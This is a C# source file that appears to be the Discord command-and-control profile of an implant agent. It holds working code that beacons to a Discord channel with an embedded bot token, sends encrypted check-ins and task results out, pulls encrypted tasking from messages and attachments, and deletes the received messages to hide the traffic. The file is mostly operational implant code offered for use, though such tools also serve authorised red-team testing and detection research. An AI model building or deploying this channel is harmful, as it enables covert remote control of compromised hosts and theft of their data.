using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using Discord;
using Discord.WebSocket;
using Newtonsoft.Json;
using System.Net.Http;

namespace Agent.Profiles
{
    public class DiscordProfile : IProfile
    {
        private IAgentConfig agentConfig { get; set; }
        private ICryptoManager crypt { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ManualResetEventSlim checkinAvailable = new ManualResetEventSlim(false);
        private static readonly TimeSpan CheckinResponseTimeout = TimeSpan.FromSeconds(30);
        private ManualResetEventSlim clientReady = new ManualResetEventSlim(false);
        private Func<Task> startClient;
        private Func<Task> loginClient;
        private Func<LoginState> getLoginState;
        private TimeSpan connectionTimeout = TimeSpan.FromSeconds(30);
        private readonly string _token;
        private readonly ulong _channel_id;
        private readonly string _uuid = Guid.NewGuid().ToString();
        private ITextChannel _channel { get; set; }
        private readonly DiscordSocketClient _client;
        private readonly HttpClient _httpClient;
        private CheckinResponse cir;

        private bool checkedin = false;
        private int currentAttempt = 0;
        private int maxAttempts = 10;

        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;

        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
        public DiscordProfile(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
        {
            this.crypt = crypto;
            this.agentConfig = config;
            this.logger = logger;
            this.messageManager = messageManager;
            DiscordChannelOptions? opts = null;
            try
            {
                opts = System.Text.Json.JsonSerializer.Deserialize(
                    ChannelConfig.Decode(),
                    DiscordChannelOptionsJsonContext.Default.DiscordChannelOptions);
            }
            catch (Exception ex)
            {
                this.logger.Log($"Failed to deserialize Discord channel options: {ex.Message}");
            }
            opts ??= new DiscordChannelOptions();
            _token = opts.DiscordToken ?? string.Empty;
            _ = ulong.TryParse(opts.BotChannel, out _channel_id);

            var gateway_config = new DiscordSocketConfig()
            {
                GatewayIntents = GatewayIntents.AllUnprivileged | GatewayIntents.MessageContent
            };
            _httpClient = new HttpClient();
            _client = new DiscordSocketClient(gateway_config);
            startClient = () => _client.StartAsync();
            loginClient = () => _client.LoginAsync(TokenType.Bot, _token);
            getLoginState = () => _client.LoginState;
            _client.MessageReceived += _client_MessageReceived;
            _client.Ready += _client_Ready;
        }

        private Task _client_Ready()
        {
            _channel = (ITextChannel)_client.GetChannel(_channel_id);

            if (_channel is null)
            {
                Environment.Exit(0);
            }
            clientReady.Set();
            return Task.CompletedTask;
        }

        private async Task _client_MessageReceived(SocketMessage message)
        {
            if (message is null)
            {
                return;
            }

            try
            {
                var attachment = message.Attachments.FirstOrDefault();
                string content = attachment?.Filename?.Contains(_uuid) == true
                    ? await GetFileContentsAsync(attachment.Url)
                    : message.Content;

                if (HandleInboundMessage(content))
                {
                    try
                    {
                        _ = message.DeleteAsync();
                    }
                    catch { }
                }
            }
            catch
            {
                // A malformed peer message must not fault Discord's receive callback.
            }
        }

        private bool HandleInboundMessage(string content)
        {
            MessageWrapper? discordMessage;
            try
            {
                discordMessage = JsonConvert.DeserializeObject<MessageWrapper>(content);
            }
            catch
            {
                return false;
            }

            if (discordMessage is null || discordMessage.to_server || discordMessage.client_id != _uuid)
            {
                return false;
            }

            try
            {
                ProcessDecryptedMessage(this.crypt.Decrypt(discordMessage.message));
            }
            catch
            {
                // JSON, Base64, crypto, and tasking failures are peer-controlled.
            }

            return true;
        }

        private void ProcessDecryptedMessage(string plaintext)
        {
            if (!checkedin)
            {
                CheckinResponse? response = System.Text.Json.JsonSerializer.Deserialize(plaintext, CheckinResponseJsonContext.Default.CheckinResponse);
                if (!CheckinResponseValidation.IsSuccessful(response))
                {
                    return;
                }

                cir = response;
                checkinAvailable.Set();
                return;
            }

            //If we make it to here, it's a tasking response
            GetTaskingResponse? gtr = System.Text.Json.JsonSerializer.Deserialize(plaintext, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
            if (gtr?.action == "get_tasking")
            {
                this.SetTaskingReceived?.Invoke(this, new TaskingReceivedArgs(gtr));
            }
        }

        private Task<bool> EnsureLoggedIn() =>
            getLoginState() == LoginState.LoggedIn ? Task.FromResult(true) : this.Start();

        private async Task<bool> Start()
        {
            clientReady.Reset();
            if (!await WaitForConnectionStep(startClient(), connectionTimeout, cancellationTokenSource.Token) ||
                !await WaitForConnectionStep(loginClient(), connectionTimeout, cancellationTokenSource.Token) ||
                !await CheckinResponseWait.WaitAsync(clientReady, connectionTimeout, cancellationTokenSource.Token))
            {
                return false;
            }
            return getLoginState() == LoginState.LoggedIn;
        }

        private static async Task<bool> WaitForConnectionStep(Task operation, TimeSpan timeout, CancellationToken cancellationToken)
        {
            try
            {
                await operation.WaitAsync(timeout, cancellationToken);
                return true;
            }
            catch (TimeoutException)
            {
                ObserveFault(operation);
                return false;
            }
            catch (OperationCanceledException)
            {
                ObserveFault(operation);
                return false;
            }
        }

        private static void ObserveFault(Task operation) =>
            _ = operation.ContinueWith(
                task => _ = task.Exception,
                CancellationToken.None,
                TaskContinuationOptions.OnlyOnFaulted | TaskContinuationOptions.ExecuteSynchronously,
                TaskScheduler.Default);

        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            await this.Send(System.Text.Json.JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));

            if (!await CheckinResponseWait.WaitAsync(checkinAvailable, CheckinResponseTimeout, cancellationTokenSource.Token))
            {
                return new CheckinResponse { status = "failed" };
            }

            this.checkedin = true;
            return this.cir;
        }

        public async Task StartBeacon()
        {
            //Main beacon loop handled here
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                if (!await EnsureLoggedIn())
                {
                    RecordAttemptResult(false);
                    continue;
                }

                //Check if we have something to send.
                if (!this.messageManager.HasResponses())
                {
                    try
                    {
                        await Task.Delay(100, cancellationTokenSource.Token);
                    }
                    catch (OperationCanceledException) when (cancellationTokenSource.IsCancellationRequested)
                    {
                        break;
                    }
                    continue;
                }

                try
                {
                    bool delivered = await messageManager.DeliverAsync(
                        this.Send,
                        result => result);
                    RecordAttemptResult(delivered);
                }
                catch (Exception)
                {
                    RecordAttemptResult(false);
                }
            }
        }

        private void RecordAttemptResult(bool succeeded)
        {
            this.currentAttempt = succeeded ? 0 : this.currentAttempt + 1;
            if (this.currentAttempt >= this.maxAttempts)
            {
                this.cancellationTokenSource.Cancel();
            }
        }

        internal async Task<bool> Send(string json)
        {
            if (!await EnsureLoggedIn())
            {
                return false;
            }

            var discordMessage = new MessageWrapper()
            {
                to_server = true,
                sender_id = _uuid,
                message = this.crypt.Encrypt(json),
                client_id = "",
            };

            _channel ??= (ITextChannel)_client.GetChannel(_channel_id);
            string serializedMessage = System.Text.Json.JsonSerializer.Serialize(discordMessage);

            if (json.Length > 1950)
            {
                using var stream = new MemoryStream(System.Text.Encoding.ASCII.GetBytes(serializedMessage));
                await _channel.SendFileAsync(stream, discordMessage.client_id + ".server");
            }
            else
            {
                await _channel.SendMessageAsync(serializedMessage);
            }

            return true;
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();
            return true;
        }

        private async Task<string> GetFileContentsAsync(string url)
        {
            string message = string.Empty;
            try
            {
                using HttpResponseMessage response = await _httpClient.GetAsync(url);
                using HttpContent content = response.Content;
                message = await content.ReadAsStringAsync();
            }
            catch { }
            return Unescape(message);
        }

        private static string Unescape(string message) =>
            message.TrimStart('"').TrimEnd('"').Replace("\\\"", "\"");
    }
}
